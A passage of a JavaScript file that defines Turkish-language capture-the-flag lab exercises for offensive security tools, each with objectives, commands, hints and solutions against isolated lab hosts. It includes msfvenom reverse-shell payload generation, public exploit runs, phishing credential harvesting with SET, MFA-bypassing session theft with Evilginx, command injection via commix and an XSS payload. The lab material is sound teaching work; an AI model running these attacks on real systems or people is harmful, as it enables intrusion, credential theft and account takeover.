      "python3 49757.py target",
    ],
    hints: ["`searchsploit -m <yol>` exploit'i çalışma dizinine kopyalar.", "Exploit hedef IP/host ister."],
    solution: "searchsploit ile sürüme uygun exploit'i bul, `-m` ile al, target'a karşı çalıştır; çıkan shell'de flag'i oku.",
    flagHint: "Flag, public exploit ile açılan erişimde okunur (/root/flag.txt).",
    gui: false,
  },
  "tool-msfvenom": {
    icon: "🧨", name: "msfvenom — Payload Üret & Reverse Shell", cat: "exploit", interactive: true,
    intro: "msfvenom ile bir reverse-shell payload'ı üret, hedefe çalıştır ve multi/handler ile shell yakala.",
    story: "Bir dosya yükleyebildiğin hedefte, msfvenom ile kendi reverse-shell payload'unu üretip çalıştırırsan tam kontrol elde edersin. Payload üret, dinleyiciyi kur, hedefte çalıştır ve flag'i oku.",
    objectives: [
      "`msfvenom` ile saldırgan IP'sine dönen bir payload üret",
      "msfconsole `multi/handler` ile dinle",
      "Payload'u hedefte çalıştır; shell açılınca flag'i oku",
    ],
    targets: [{ host: "target", note: "payload yüklenip çalıştırılabilen hedef" }],
    cmds: [
      "ip a   # saldırgan (eth0) IP'sini öğren → LHOST",
      "msfvenom -p linux/x64/shell_reverse_tcp LHOST=<sen> LPORT=4444 -f elf -o sh.elf",
      "# msfconsole: use multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST <sen>; run",
    ],
    hints: ["LHOST = saldırgan kutusunun eth0 IP'si.", "Payload'u hedefe upload endpoint'i ile gönderip çalıştır."],
    solution: "msfvenom ile reverse shell üret, multi/handler ile dinle, hedefte çalıştır; bağlanan shell'de `cat /root/flag.txt`.",
    flagHint: "Flag, reverse shell ile bağlandığın hedefte /root/flag.txt içindedir.",
    gui: false,
  },

  /* ───────────────────────── SOSYAL MÜHENDİSLİK (social) ───────────────────────── */
  "tool-setoolkit": {
    icon: "🎣", name: "SET — Social-Engineer Toolkit (Phishing)", cat: "social", interactive: true,
    intro: "SEToolkit ile gerçek bir login sayfasını klonla, sahte sayfayı yayınla ve kurbanın girdiği kimlik bilgilerini topla.",
    story: "Sosyal mühendislik, en güçlü saldırı vektörlerinden biridir. SET'in 'Credential Harvester'ı bir login sayfasını birebir klonlar ve kurban giriş yapınca kullanıcı adı/parolayı sana gönderir. Hedef portalı klonla; kurban bot giriş yapınca toplanan kimlik bilgisini oku — flag o paroladır.",
    objectives: [
      "SET'i başlat → Social-Engineering Attacks → Website Attack → Credential Harvester → Site Cloner",
      "`http://target` login sayfasını klonla, saldırgan IP'sinde yayınla",
      "Kurban giriş yapınca toplanan kimlik bilgisindeki flag'i oku",
    ],
    targets: [
      { host: "target", note: "klonlanacak gerçek login portalı" },
      { host: "victim", note: "kurban bot — saldırgan IP'sindeki sahte sayfaya giriş yapar" },
    ],
    cmds: [
      "setoolkit",
      "# 1) Social-Engineering Attacks → 2) Website Attack Vectors",
      "# 3) Credential Harvester → 2) Site Cloner → URL: http://target",
    ],
    hints: ["Harvester yakaladığı POST'u terminale/`/root/.set/` altına yazar.", "Kurban birkaç saniyede bir sahte sayfaya giriş yapar."],
    solution: "SET Credential Harvester + Site Cloner ile target'ı klonla; kurban giriş yapınca SET çıktısında `password=ordek{...}` görünür — o flag'tir.",
    flagHint: "Flag = SET'in topladığı kurban parolasıdır.",
    gui: false,
  },
  "tool-evilginx": {
    icon: "😈", name: "Evilginx3 — Reverse-Proxy Phishing (Oturum Çalma)", cat: "social", interactive: true,
    intro: "Evilginx3 ile bir login portalını reverse-proxy'leyerek MFA'yı bile atlatan oturum çerezini (session token) yakala.",
    story: "Klasik phishing parolayı çalar ama MFA'yı geçemez. Evilginx, kurban ile gerçek site arasında reverse-proxy olur: kurban gerçekten giriş yapar (MFA dahil), Evilginx ise oturum çerezini yakalar. O çerezle kurbanın hesabına parolasız girilir. Phishlet'i yükle, kurban giriş yapınca yakalanan session token = flag.",
    objectives: [
      "Evilginx3'ü başlat; `ordek` phishlet'ini yükle ve etkinleştir (hedef: target)",
      "Bir lure (oltalama) URL'si oluştur",
      "Kurban bot lure'a girip kimlik doğrulayınca yakalanan session token'ı oku",
    ],
    targets: [
      { host: "target", note: "reverse-proxy'lenecek login portalı (yerel CA/TLS)" },
      { host: "victim", note: "kurban bot — lure URL'sine girip giriş yapar (oturum çerezi taşır)" },
    ],
    cmds: [
      "evilginx",
      "  phishlets hostname ordek phish.ordek.lab",
      "  phishlets enable ordek",
      "  lures create ordek ; lures get-url 0",
      "  sessions            # yakalanan oturumları listele",
    ],
    hints: ["`sessions` komutu yakalanan token'ları listeler.", "Kurban lure'a giriş yapınca `sessions <id>` token'ı gösterir — o flag'tir."],
    solution: "Phishlet'i etkinleştir, lure URL'sini kurban ziyaret edip giriş yapınca `sessions` altında yakalanan session cookie/token görünür — o değer flag'tir.",
    flagHint: "Flag = Evilginx'in yakaladığı oturum çerezi/token değeridir.",
    gui: false,
  },

  /* ═══════════════════════ FAZ 2 — 10 YENİ ARAÇ ═══════════════════════ */
  "tool-nuclei": {
    icon: "🧬", name: "Nuclei — Şablon Tabanlı Zafiyet Tarama", cat: "recon", interactive: true,
    intro: "nuclei ile YAML şablonları kullanarak hedefte bilinen zafiyet/yanlış-yapılandırmaları otomatik tara.",
    story: "Modern keşifte tek tek elle bakmak yerine binlerce topluluk şablonunu çalıştırırsın. Hedefte sızan bir `.env` dosyası var; nuclei'nin 'exposure' şablonları onu yakalar.",
    objectives: ["`nuclei -u http://10.13.37.10` ile hedefi tara", "'exposed-config / exposed-env' bulgusunu incele", "Sızan dosyadaki gizli anahtarı (flag) oku"],
    targets: [{ host: "target", ip: "10.13.37.10", note: "yanlış-yapılandırılmış web (sızan /.env)" }],
    cmds: ["nuclei -u http://10.13.37.10 -tags exposure,misconfig", "curl http://10.13.37.10/.env   # nuclei'nin bulduğu sızıntı"],
    hints: ["`-tags exposure` ile yapılandırma sızıntılarına odaklan.", "Bulunan yolu curl ile aç; içindeki SECRET flag'tir."],
    solution: "`nuclei -u http://10.13.37.10` → exposed-env bulgusu → `curl http://10.13.37.10/.env` → SECRET=ordek{...}.",
    flagHint: "Flag, nuclei'nin bulduğu sızan /.env dosyasındaki SECRET değeridir.", gui: false,
  },
  "tool-gobuster": {
    icon: "📁", name: "Gobuster — Dizin & Dosya Keşfi", cat: "recon", interactive: true,
    intro: "gobuster ile bir sözlük kullanarak gizli dizin ve dosyaları hızlıca brute-force keşfet.",
    story: "Bağlantısı verilmeyen ama var olan yönetim dizinleri çoğu sızıntının kaynağıdır. gobuster sözlükle yolları dener; gizli /admin altında flag dosyası seni bekler.",
    objectives: ["`gobuster dir` ile gizli dizinleri keşfet", "robots.txt'teki ipuçlarını doğrula", "/admin altındaki flag dosyasını oku"],
    targets: [{ host: "target", ip: "10.13.37.10", note: "gizli /admin/flag.txt barındıran web" }],
    cmds: ["gobuster dir -u http://10.13.37.10 -w /usr/share/wordlists/dirb/common.txt", "curl http://10.13.37.10/admin/flag.txt"],
    hints: ["common.txt çoğu yaygın yolu içerir.", "`/admin` bulununca içindeki flag.txt'i curl ile oku."],
    solution: "`gobuster dir -u http://10.13.37.10 -w .../common.txt` → /admin bulunur → `curl http://10.13.37.10/admin/flag.txt` → flag.",
    flagHint: "Flag, /admin/flag.txt içindedir.", gui: false,
  },
  "tool-whatweb": {
    icon: "🔎", name: "WhatWeb — Teknoloji Parmak İzi", cat: "recon", interactive: true,
    intro: "whatweb ile hedefin sunucu, çatı, sürüm ve gömülü meta bilgilerini pasifçe parmak-izle.",
    story: "Saldırıdan önce 'ne ile konuşuyorum?' sorusu kritiktir. whatweb başlıkları ve sayfa meta'larını okur; geliştiricinin unuttuğu bir generator meta'sında flag saklı.",
    objectives: ["`whatweb http://10.13.37.10` ile teknolojiyi tespit et", "Sunucu sürümü + meta generator alanını incele", "Meta/başlıktaki gizli flag'i oku"],
    targets: [{ host: "target", ip: "10.13.37.10", note: "parmak-izi sızan web (meta generator)" }],
    cmds: ["whatweb -a 3 http://10.13.37.10", "curl -s http://10.13.37.10/ | grep -i generator"],
    hints: ["`-a 3` agresif kip daha çok plugin çalıştırır.", "MetaGenerator plugin'inin değerine bak."],
    solution: "`whatweb -a 3 http://10.13.37.10` → Apache/2.2.8 + MetaGenerator: ordek{...}. Aynı flag sayfa kaynağındaki <meta name=generator>'da.",
    flagHint: "Flag, sayfanın <meta name=generator> değeridir (whatweb raporlar).", gui: false,
  },
  "tool-sslscan": {
    icon: "🔐", name: "sslscan — TLS/SSL Denetimi", cat: "recon", interactive: true,
    intro: "sslscan ile bir TLS servisinin desteklediği protokol/şifreleri ve sertifika ayrıntılarını denetle.",
    story: "Zayıf TLS yapılandırmaları (eski protokol, zayıf şifre, sızdıran sertifika) hâlâ yaygın. Hedef 443'te self-signed bir sertifika sunuyor; sertifikanın OU alanına bir sır gömülmüş.",
    objectives: ["`sslscan 10.13.37.10:443` ile TLS'i denetle", "Desteklenen zayıf protokol/şifreleri gözle", "Sertifika konusundaki (Subject/OU) gizli flag'i oku"],
    targets: [{ host: "target", ip: "10.13.37.10", note: "self-signed TLS servisi (sertifika OU=flag)" }],
    cmds: ["sslscan 10.13.37.10:443", "openssl s_client -connect 10.13.37.10:443 </dev/null 2>/dev/null | openssl x509 -noout -subject"],
    hints: ["sslscan sertifika konusunu (Subject) raporlar.", "`openssl x509 -subject` ile OU alanına bak."],
    solution: "`sslscan 10.13.37.10:443` → Subject OU=ordek{...}. Ya da `openssl s_client -connect 10.13.37.10:443 | openssl x509 -noout -subject`.",
    flagHint: "Flag, TLS sertifikasının Subject OU alanındadır.", gui: false,
  },
  "tool-netexec": {
    icon: "🌐", name: "NetExec (CME) — SMB/AD Toplu Sömürü", cat: "exploit", interactive: true,
    intro: "netexec (eski crackmapexec) ile SMB üzerinde null-session, paylaşım listeleme ve kimlik denemesi yap.",
    story: "Ağ pentestinin İsviçre çakısı netexec'tir: tek komutla SMB'de oturum aç, paylaşımları listele, kimlik püskürt. Hedef SMB null-session'a açık; bir paylaşımda flag var.",
    objectives: ["`nxc smb 10.13.37.10` ile host bilgisini al", "Null-session ile paylaşımları listele (`--shares`)", "Okunabilir paylaşımdaki flag dosyasını çek"],
    targets: [{ host: "target", ip: "10.13.37.10", note: "null-session'a açık SMB (Samba)" }],
    cmds: ["nxc smb 10.13.37.10 -u '' -p '' --shares", "nxc smb 10.13.37.10 -u guest -p '' --spider public --regex ordek"],
    hints: ["Boş kullanıcı/parola (null session) çoğu yanlış-yapılandırmada çalışır.", "`--shares` okunabilir paylaşımları gösterir; içinde flag dosyası ara."],
    solution: "`nxc smb 10.13.37.10 -u '' -p '' --shares` → public (READ) → smbclient/nxc ile flag.txt → ordek{...}.",
    flagHint: "Flag, anonim okunabilir SMB paylaşımındaki dosyadadır.", gui: false,
  },
  "tool-impacket": {
    icon: "🐍", name: "Impacket — Ağ Protokolü Saldırı Seti", cat: "exploit", interactive: true,
    intro: "impacket script'leriyle (smbclient/lookupsid) SMB ve RPC üzerinden enumerasyon ve veri çekme yap.",
    story: "Impacket, AD/Windows ağ saldırılarının temelidir. smbclient.py ile paylaşımlara bağlan, lookupsid.py ile kullanıcıları çıkar. Hedef SMB'de gizli bir paylaşımda sır saklı.",
    objectives: ["`impacket-smbclient` ile null-session bağlan", "Paylaşımları listele (shares) ve gez", "Gizli dosyadaki flag'i indir/oku"],
    targets: [{ host: "target", ip: "10.13.37.10", note: "SMB hedefi (impacket smbclient/lookupsid)" }],
    cmds: ["impacket-smbclient -no-pass guest@10.13.37.10", "  # shares ; use public ; ls ; get flag.txt", "impacket-lookupsid -no-pass guest@10.13.37.10"],
    hints: ["`-no-pass` ile null/guest dene.", "smbclient kabuğunda `shares`, `use <ad>`, `get <dosya>`."],
    solution: "`impacket-smbclient -no-pass guest@10.13.37.10` → shares → use public → get flag.txt → ordek{...}.",
    flagHint: "Flag, impacket-smbclient ile indirdiğin paylaşım dosyasındadır.", gui: false,
  },
  "tool-gitleaks": {
    icon: "🔑", name: "Gitleaks — Git Geçmişinde Sır Avı", cat: "recon", interactive: true,
    intro: "gitleaks ile bir git deposunun TÜM geçmişinde (silinmiş commit'ler dahil) sızmış API anahtarı/parola ara.",
    story: "Geliştiriciler sırları yanlışlıkla commit'ler, sonra siler — ama git geçmişi onları tutar. Saldırgan kutusundaki klonlanmış depoda, geçmişte silinmiş bir flag commit'i var.",
    objectives: ["`gitleaks detect` ile depo geçmişini tara", "Bulguların commit/satır bağlamını incele", "Sızan sırrı (flag) çıkar"],
    targets: [], loot: true,
    cmds: ["cd /root/loot/ordek-repo", "gitleaks detect --source . -v", "git log --all -p | grep -i ordek{"],
    hints: ["`--source .` mevcut depoyu, tüm geçmişiyle tarar.", "Bulgu silinmiş bir commit'te olabilir; `git log --all -p`."],
    solution: "`cd /root/loot/ordek-repo && gitleaks detect --source . -v` → geçmişte sızan SECRET=ordek{...}.",
    flagHint: "Flag, git geçmişine sızmış (sonra silinmiş) sırdır.", gui: false,
  },
  "tool-subfinder": {
    icon: "🛰️", name: "Subfinder — Subdomain Keşfi", cat: "recon", interactive: true,
    intro: "subfinder ile bir alan adının subdomain'lerini topla; ardından ilginç olanı çözümleyip flag'i bul.",
    story: "Saldırı yüzeyi çoğu zaman ana alandan değil unutulmuş subdomain'lerden açılır. Hedef iç DNS'te ördek.lab bölgesi var; subfinder+resolver ile gizli subdomain'i bul, TXT kaydındaki flag'i çek.",
    objectives: ["subfinder'ı iç resolver'la çalıştır (`-r 10.13.37.10`)", "Listelenen subdomain'lerden gizli olanı seç", "O subdomain'in TXT kaydındaki flag'i `dig` ile oku"],
    targets: [{ host: "target", ip: "10.13.37.10", note: "iç DNS (ordek.lab bölgesi + gizli subdomain TXT)" }],
    cmds: ["subfinder -d ordek.lab -r 10.13.37.10 -all", "dig @10.13.37.10 flag.ordek.lab TXT +short"],
    hints: ["İzole ağda subfinder'a iç resolver'ı `-r` ile ver.", "Gizli subdomain'in TXT kaydında ordek{...} yazılı."],
    solution: "`subfinder -d ordek.lab -r 10.13.37.10` (ya da zone-transfer) → flag.ordek.lab → `dig @10.13.37.10 flag.ordek.lab TXT` → ordek{...}.",
    flagHint: "Flag, gizli subdomain'in DNS TXT kaydındadır.", gui: false,
  },
  "tool-commix": {
    icon: "💉", name: "Commix — Otomatik Komut Enjeksiyonu", cat: "web", interactive: true,
    intro: "commix ile bir web parametresindeki komut enjeksiyonunu otomatik tespit edip sömür, kabuk al.",
    story: "Elle yaptığın command-injection'ı commix saniyeler içinde otomatikleştirir. Hedefte bir 'ping' aracı girdiyi shell'e geçiriyor; commix bunu bulup sana pseudo-shell verir.",
    objectives: ["`commix -u .../ping?host=127.0.0.1` ile enjeksiyonu tespit ettir", "Pseudo-shell al", "`cat` ile sunucudaki flag dosyasını oku"],
    targets: [{ host: "target", ip: "10.13.37.10", note: "komut enjeksiyonuna açık /ping aracı" }],
    cmds: ["commix -u 'http://10.13.37.10/ping?host=127.0.0.1' --batch", "commix -u 'http://10.13.37.10/ping?host=127.0.0.1' --batch --os-cmd='cat /tmp/ci_flag.txt'"],
    hints: ["`--batch` varsayılanları kabul eder.", "Shell alınca `cat /tmp/ci_flag.txt`."],
    solution: "`commix -u 'http://10.13.37.10/ping?host=127.0.0.1' --batch --os-cmd='cat /tmp/ci_flag.txt'` → ordek{...}.",
    flagHint: "Flag, commix ile aldığın shell'de /tmp/ci_flag.txt dosyasındadır.", gui: false,
  },
  "tool-dalfox": {
    icon: "⚡", name: "Dalfox — Otomatik XSS Tarama", cat: "web", interactive: true,
    intro: "dalfox ile bir parametredeki XSS'i otomatik keşfet, doğrula ve sömürü PoC'unu üret.",
    story: "XSS'i elle aramak yorucu; dalfox parametreleri fuzzlayıp gerçekten çalışan XSS'i doğrular. Hedefte yansıyan bir arama parametresi var; dalfox onu bulunca sayfada gizli flag açığa çıkar.",
    objectives: ["`dalfox url .../search?q=FUZZ` ile XSS tara", "Doğrulanan yansıma parametresini gör", "XSS sayfasının kaynağındaki gizli flag'i oku"],
    targets: [{ host: "target", ip: "10.13.37.10", note: "yansıyan XSS'e açık /search parametresi" }],
    cmds: ["dalfox url 'http://10.13.37.10/search?q=FUZZ'", "curl -s 'http://10.13.37.10/search?q=<script>1</script>' | grep -i ordek{"],
    hints: ["FUZZ yerine dalfox payload enjekte eder.", "XSS doğrulanınca sayfa kaynağındaki yorum/flag'i oku."],
    solution: "`dalfox url 'http://10.13.37.10/search?q=FUZZ'` → reflected XSS PoC. `curl '.../search?q=<script>x</script>'` → kaynak yorumunda ordek{...}.",
    flagHint: "Flag, XSS doğrulanan /search sayfasının kaynağındaki yorumdadır.", gui: false,
  },
};

// Yol haritası sırası (pedagojik): keşif → trafik → web → parola → exploit → sosyal.
export const TOOL_LAB_ORDER = [
  "tool-linux",
  "tool-nmap", "tool-dnsrecon", "tool-theharvester", "tool-ffuf", "tool-nikto", "tool-smb", "tool-wpscan",
  "tool-wireshark", "tool-tcpdump", "tool-bettercap", "tool-responder",
  "tool-burp", "tool-sqlmap", "tool-beef",
  "tool-hydra", "tool-john", "tool-hashcat", "tool-aircrack",
  "tool-metasploit", "tool-searchsploit", "tool-msfvenom",
  "tool-setoolkit", "tool-evilginx",
  // ── Faz 2: 10 yeni araç ──
  "tool-nuclei", "tool-gobuster", "tool-whatweb", "tool-sslscan",
  "tool-netexec", "tool-impacket", "tool-gitleaks", "tool-subfinder",
  "tool-commix", "tool-dalfox",
];

export const TOOL_LAB_SLUGS = TOOL_LAB_ORDER.slice();
